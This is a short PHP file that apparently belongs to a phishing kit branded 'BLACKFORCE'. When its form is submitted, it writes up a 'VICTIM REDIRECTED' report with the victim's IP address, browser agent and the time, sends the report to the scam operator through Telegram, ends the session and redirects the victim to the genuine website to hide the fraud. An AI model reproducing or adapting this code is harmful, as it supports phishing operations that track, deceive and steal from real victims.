<?php 
require_once 'panel.php' ;

// FUCKED Config Start

if(isset($_POST['submit'])) {
        
    $subject = " VICTIM REDIRECTED FROM SCAM $ip";
    $rezdata = "🕵🏻‍♂️ VICTIM REDIRECTED ".SCAM_NAME." ".FLAG."
    
⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
        
⚡️ BLACKFORCE™ ⚡️
";

    sendTelegram($rezdata);
    
    session_destroy();
    header("Location: ".WEBSITE);
}
// FUCKED Config END